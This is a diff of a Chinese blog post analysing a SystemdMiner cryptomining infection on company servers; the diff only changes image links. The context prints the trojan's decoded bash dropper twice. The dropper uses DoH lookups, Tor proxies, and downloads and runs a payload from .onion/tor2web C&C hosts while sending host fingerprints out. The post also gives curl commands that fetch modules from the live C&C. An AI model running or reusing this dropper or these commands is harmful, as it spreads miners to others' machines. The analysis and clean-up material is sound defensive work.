@@ -173,24 +173,24 @@
 <p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051053459.png" alt="image-20230405105350408"></p>
 <hr>
 <p>先登陆到208的主机去查看一下，查看下进程CPU使用率正常，并无挖矿迹象，可能是防火墙策略开启，木马连接不上矿池，先暂时隐蔽下来了</p>
-<p><img src="https://img-blog.csdnimg.cn/5b94dbb173574f148127ec142ad0530d.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051110091.png" alt="在这里插入图片描述"></p>
 <p>（这里要注意的是区分系统进程和木马进程，因为很多木马的进程都是以随机字符名称出现的，例如<code>kswapd1</code>和<code>kswapd0</code>也比较类似，但是这两个进程是系统进程，所以不要混淆，其实如果挖矿进程在跑的话，很容易便会发现其进程PID和名称）</p>
 <p>通常挖矿木马都会去写一个计划任务，来防止挖矿进程被删掉，这里看了一位大师傅的溯源分析，提到了cron在执行时，会读取三个地方的配置文件：一是<code>/etc/crontab</code>，二是<code>/etc/cron.d</code>目录下的所有文件，三是每个用户的配置文件，所以挖矿木马可能会有多个定时任务存在</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/5737ace0b3e1468d9ac24c8e398032d7.png" alt="="></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051110260.png" alt="="></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/cron.d/</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/0be838e0c532462496ba71d9d48dafd3.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111785.png" alt="在这里插入图片描述"></p>
 <p>果然存在两个定时任务，查看一下里面的内容两个文件内容一致，且内容为base64编码，先对其进行解码处理，而且<code>virustotal</code>判断为恶意文件</p>
-<p><img src="https://img-blog.csdnimg.cn/1e8eff71f11b4683a9718ac7b25b5d38.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111124.png" alt="在这里插入图片描述"></p>
 <p>分析一下：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">uMjSD9OaH5uA4C3CCjD4q2XEwo1s0H0</span><br><span class="line">exec &amp;&gt;/dev/null #不输出出错和输出信息</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取当前用户的家目录</span></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取执行命令</span></span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C&amp;C域名为fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.*</span></span><br><span class="line">t=$(echo &quot;fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad&quot;)</span><br><span class="line"></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(dns.digitale-gesellschaft.ch doh.li doh.pub fi.doh.dns.snopyta.org hydra.plan9-ns1.com resolver-eu.lelux.fi dns.hostux.net dns.twnic.tw doh-fi.blahdns.com resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)#代理域名relay.tor2socks.in</span><br><span class="line">q=$&#123;n[$((RANDOM%$&#123;#n[@]&#125;))]&#125;</span><br><span class="line">s=$($c https://$q/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &#x27; &#x27; &#x27;\n&#x27;|grep -Ev [.]0|sort -uR|tail -1)</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在几个目录路径里寻找一个有读写权限的路径</span></span><br><span class="line">fexe() &#123;</span><br><span class="line">for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u() &#123;</span><br><span class="line">sockz</span><br><span class="line">f=/int.$(uname -m)</span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-) #用当前时间生成 md5 码</span><br><span class="line">r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &#x27;inet &#x27;|awk &#123;&#x27;print $2&#x27;&#125;|md5sum|awk &#123;&#x27;print $1&#x27;&#125;)_$(crontab -l|base64 -w0)#crontab计划任务执行</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载病毒母体，随机方式进行命名，通过socket5的方式用relay.tor2socks.in代理访问C&amp;C域名</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">c -x socks5h://<span class="variable">$s</span>:9050 <span class="variable">$t</span>.onion<span class="variable">$f</span> -o<span class="variable">$x</span> -e<span class="variable">$r</span> || <span class="variable">$c</span> $1<span class="variable">$f</span> -o<span class="variable">$x</span> -e<span class="variable">$r</span></span></span><br><span class="line">chmod +x $x;$x;rm -f $x#运行后删除病毒文件</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for h in tor2web.in tor2web.it</span><br><span class="line">do</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查木马是否存在，若不存在则调用fexe测试执行，接着调用u <span class="variable">$t</span>.<span class="variable">$h</span> 进行木马文件的下载</span></span><br><span class="line">if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then</span><br><span class="line">fexe;u $t.$h</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">再次查看进程状态，若没有继续下载木马</span></span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)</span><br><span class="line">else</span><br><span class="line">break</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
 
 <p><code>sockz()</code>函数通过<code>doh</code>查询IP，通过这种方法既可以提供加密保护dns查询结果，又可以绕过各大厂商IDS里恶意域名的IOC</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://doh.pub/dns-query?name=relay.tor2socks.in</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/66340f3d765e42348c439edac0d21733.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111454.png" alt="在这里插入图片描述"></p>
 <p>经过分析，这个样本的执行的总体流程如下：</p>
 <ol>
 <li>doh解析域名获取tor代理IP</li>
@@ -205,12 +205,12 @@
 <li>在/tmp目录下有<code>systemd*</code>的文件</li>
 </ul>
 <p>并且这个<code>SystemdMiner</code>是一个变种，除了更新了C&amp;C域名，使用socks5代理的方式访问C&amp;C域名从而实现绕过安全网关的目的，其余的特征与以往其他版本类似，通过上面的分析，知道该脚本会创建一个<code>/tmp/.X11-unix/</code>文件夹，里面存放着的是进程PID</p>
-<p><img src="https://img-blog.csdnimg.cn/0631b8105a4f48e780c3d51a624efba0.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111664.png" alt="在这里插入图片描述"></p>
 <p>通过PID找一下病毒文件位置</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /proc/&#123;PID&#125;/exe</span><br></pre></td></tr></table></figure>
 
 <p>发现病毒文件已经都被删除，查看一下00、01这些文件是什么时间创建的，可以对比一下其他机器的时间，找出最早的时间，方便后面的溯源</p>
-<p><img src="https://img-blog.csdnimg.cn/e1f7457b95c148e3bdbcc81fa6b372ac.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111649.png" alt="在这里插入图片描述"></p>
 <p>看了许多师傅们分析的文章，<code>.X11-unix</code>文件夹下的文件作用如下：</p>
 <table>
 <thead>
@@ -235,16 +235,16 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status</span><br><span class="line">2.ps -ef|grep 13485 </span><br><span class="line">3.lsof -p 13485</span><br></pre></td></tr></table></figure>
 
 <p>01通过 lsof 判断，没有发现有外连或打开端口的现象</p>
-<p><img src="https://img-blog.csdnimg.cn/5dd4d976235740fc88fccc0abdc29f7c.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111808.png" alt="在这里插入图片描述"></p>
 <p>再查看11的进程状态，发现有外连</p>
-<p><img src="https://img-blog.csdnimg.cn/5b0089d1a73b458a9e56d8427192d3dd.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111572.png" alt="在这里插入图片描述"></p>
 <p>但是较为奇怪的是，攻击者只是上传了一个守护进程，找不到下载的病毒文件，CPU也没有异常，为了防止出现问题，还是先将定时任务以及进程先杀掉，接下来将病毒文件下载起来在虚拟机执行一下。</p>
 <h4 id="虚拟机执行测试"><a href="#虚拟机执行测试" class="headerlink" title="虚拟机执行测试"></a>虚拟机执行测试</h4><p>先按照守护进程下载病毒文件的方式，将病毒文件下载起来</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -4fsSLkA- -m200 fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.tor2web.it/int.x86_64 -o  int.x86_64 -e183.134.110.75</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/9277f4706209415b8a773e6cb21736e5.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111362.png" alt="在这里插入图片描述"></p>
 <p>执行一下该ELF文件，发现<code>crotab</code>定时任务增加了新的一项任务，且root目录下生成了该任务所指向的新的脚本文件</p>
-<p><img src="https://img-blog.csdnimg.cn/ac41d2cfc5704d94b65f41371a723390.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111353.png" alt="在这里插入图片描述"></p>
 <p>查看一下该脚本文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">FBGJOndscVOU2PKZGWF8C6kibWnyHLP</span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line">t=$(echo &quot;4t5ypbzi2kko7tqmk6y345ntpmctwj5jmu3cebxsnonsdljyyfs335ad&quot;)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C&amp;C服务器域名前缀不同</span></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(dns.digitale-gesellschaft.ch doh.li doh.pub fi.doh.dns.snopyta.org hydra.plan9-ns1.com resolver-eu.lelux.fi dns.hostux.net dns.twnic.tw doh-fi.blahdns.com resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)</span><br><span class="line">q=$&#123;n[$((RANDOM%$&#123;#n[@]&#125;))]&#125;</span><br><span class="line">s=$($c https://$q/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &#x27; &#x27; &#x27;\n&#x27;|grep -Ev [.]0|sort -uR|tail -1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fexe() &#123;</span><br><span class="line">for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u() &#123;</span><br><span class="line">sockz</span><br><span class="line">f=/int.$(uname -m)</span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-)</span><br><span class="line">r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &#x27;inet &#x27;|awk &#123;&#x27;print $2&#x27;&#125;|md5sum|awk &#123;&#x27;print $1&#x27;&#125;)_$(crontab -l|base64 -w0)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">c -x socks5h://<span class="variable">$s</span>:9050 <span class="variable">$t</span>.onion<span class="variable">$f</span> -o<span class="variable">$x</span> -e<span class="variable">$r</span> || <span class="variable">$c</span> $1<span class="variable">$f</span> -o<span class="variable">$x</span> -e<span class="variable">$r</span></span></span><br><span class="line">chmod +x $x;$x;rm -f $x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for h in tor2web.in tor2web.it</span><br><span class="line">do</span><br><span class="line">if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then</span><br><span class="line">fexe;u $t.$h</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)</span><br><span class="line">else</span><br><span class="line">break</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
 
@@ -256,13 +256,13 @@
 <p>猜测代码前的字符串便是其命名中的一部分，就对该字符串进行一次全局搜索</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / 2&gt;/dev/null | grep FBGJOndscVOU2PKZGWF8C6kibWnyHLP</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/02ecae4091604b5da2eb2ebd7352c006.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111086.png" alt="在这里插入图片描述"></p>
 <p>发现三个类似的脚本文件，查看了一下内容都一致，应该是作为备份文件以防其中某一个被删</p>
 <p>查看了深信服千里目安全实验室的文章和此类情况类似，可以从病毒母体ELF文件中逆向分析出5个不同的bash命令，若tor代理可用则可以使用下面的方法去下载出各个模块</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -4fsSLkA -m200 -x socks5h://92.190.141.62:9050 4t5ypbzi2kko7tqmk6y345cebxsnonsdljyyfs335ad.onion/sshd ntpmctwj5jmu3cebxsnonsdljyyfs335ad.onion/sshd </span><br></pre></td></tr></table></figure>
 
 <p>但由于目前还不会IDA逆向调试，而且tor代理IP拒绝连接，就先使用师傅扒出来源码学习一下</p>
-<p><img src="https://img-blog.csdnimg.cn/eb9b5a906ac84482b53d45551bab15f0.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111386.png" alt="在这里插入图片描述"></p>
 <p>分别用于下载不同模块和执行不同的功能，功能如下：</p>
 <ul>
 <li><strong>本机持久化</strong>：</li>
@@ -279,7 +279,7 @@
 <ul>
 <li><strong>竞争对手清理</strong>：这个脚本的主要作用便是清除服务器上其他的挖矿木马，改写hosts文件让其他挖矿无法访问对应的域名，但是经过查询虚拟机的hosts文件，并没有发现被修改（可能是tor代理节点失效了，没有下载该模块）</li>
 </ul>
-<p><img src="https://img-blog.csdnimg.cn/ba37357dac0f4a9f825b07d02aeef486.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112437.png" alt="在这里插入图片描述"></p>
 <ul>
 <li><strong>内网传播</strong></li>
 </ul>
@@ -292,9 +292,9 @@
 <p>病毒母体执行后会下载cpu脚本,以进行挖矿，手动下载一下试试看：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -4fsSLkA- -m200 fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.tor2web.in/cpu -o  cpu -e183.134.110.75</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/9670e0b20fb94fe38d45b5bff640fdb3.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112832.png" alt="在这里插入图片描述"></p>
 <p>手动执行挖矿脚本的时候要先解除文件的锁定<code>chattr -i cpu</code>，再赋权限运行</p>
-<p><img src="https://img-blog.csdnimg.cn/0f11bbae91994018bc0fd1976a2bbc97.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112729.png" alt="在这里插入图片描述"></p>
 <p>但是在本地也没有运行起来，缺失一些配置文件，可能是因为前面的模块有的没有下载导致。</p>
 <ul>
 <li><strong>状态控制</strong></li>
@@ -305,7 +305,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -4fsSLkA- -m200 fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.tor2web.in/cmd -o  cmd -e183.134.110.75</span><br></pre></td></tr></table></figure>
 
 <p>如果用这种方法下载的话，很奇怪会得到下载ssh暴力破解的脚本，脚本内容也无法进行下载查看</p>
-<p><img src="https://img-blog.csdnimg.cn/7bb9d555491145378b67d4d73a9075c4.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112798.png" alt="在这里插入图片描述"></p>
 <h4 id="归纳梳理"><a href="#归纳梳理" class="headerlink" title="归纳梳理"></a>归纳梳理</h4><p>通过看师傅们的博客和自己的测试，对目前这个SystemedMiner挖矿木马也有了一定的了解，木马执行后，会下载一系列的模块和可执行脚本，用于持久化、内网横向渗透、挖矿、命令控制、清除一些入侵检测系统和其他挖矿程序，但需要使用tor代理，之所以服务器和虚拟机只有持久化的脚本(守护进程脚本)，就是因为病毒母体启动后，tor代理失效，无法下载其他模块和脚本，也就只有一个守护进程脚本。</p>
 <h4 id="处置方法"><a href="#处置方法" class="headerlink" title="处置方法"></a>处置方法</h4><p>在了解了SystemedMiner挖矿木马感染机器的过程后，防护便一目了然了，它做的主机持久化控制便是通过写定时任务，而定时任务是下载病毒母体并执行，就这样循环来控制主机，所以要清除该病毒文件</p>
 <ol>
@@ -319,21 +319,21 @@
 <h4 id="溯源分析"><a href="#溯源分析" class="headerlink" title="溯源分析"></a>溯源分析</h4><blockquote>
 <p>该木马通过bash命令下载执行多个功能模块，通过SSH暴力破解、SSH免密登录利用、Hadoop Yarn未授权访问漏洞和自动化运维工具内网扩散，且该木马的文件下载均利用暗网代理，感染后会清除主机上的其他挖矿木马，以达到资源独占的目的</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/3cbc5c9643b345919be602721e0c181d.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112353.png" alt="在这里插入图片描述"></p>
 <p>看了很多类似挖矿木马的文章，黑客入口都指向Hadoop Yarn未授权访问或是SSH爆破密码，既然内网的主机全被感染了，逐一来排查一下</p>
 <h5 id="Hadoop-yarn-未授权访问漏洞"><a href="#Hadoop-yarn-未授权访问漏洞" class="headerlink" title="Hadoop-yarn-未授权访问漏洞"></a>Hadoop-yarn-未授权访问漏洞</h5><ul>
 <li>影响版本：3.3.0 以下、</li>
 <li>通过REST API创建并提交任务，YARN执行任务，下载执行恶意sh脚本</li>
 </ul>
 <p>先看一下当前服务器的Hadoop版本，版本在3.3.0以下，有未授权访问的风险</p>
-<p><img src="https://img-blog.csdnimg.cn/1fd6fa3dce8542bb8616eb3f0eba6135.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112429.png" alt="在这里插入图片描述"></p>
 <p>可以查看下有关yarn的进程，看看有没有挖矿程序</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep yarn</span><br></pre></td></tr></table></figure>
 
 <p>查看了几天被感染的服务器都未发现相关信息，只能去排查一下YARN日志，看看是否有异常的<code>application</code>，204的主机曾关闭过防火墙，优先去排查一下204这台主机</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yarn application -list -appStates ALL #不显示时间信息</span><br><span class="line">yarn logs -applicationId application_1647720164720_1130</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">匹配关键字</span></span><br><span class="line">yarn application -list -appStates ALL | grep curl</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/27b9c95e13f5422ab7dee0bb8a6e502d.png" alt="在这里插入图片描述"></p>
+<p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112480.png" alt="在这里插入图片描述"></p>
 <p>也没有发现什么线索。</p>
 <p>既然在服务器上都没有下载出相应的控制、挖矿文件或模块，说明代理失效，那ssh模块也应该是无法下载的，猜测可能是自动化运维工具写入，但服务器上没有这一类工具，只能说明是利用SSH免密码登录进去的，这个病毒母体恰好有这个功能，恰好服务器也是有这个免登的功能，<strong>所以初步推断内网横向感染的原因就是因为免密码登录</strong></p>
 <p>SSH暴力破解进入其他内网主机应该不太现实，因为都是强口令，不容易被爆破出来的，而且公司服务器都有防护，如果大量爆破发包的话也会产生警告，因此这样也可以排除是SSH爆破进入服务器的。</p>
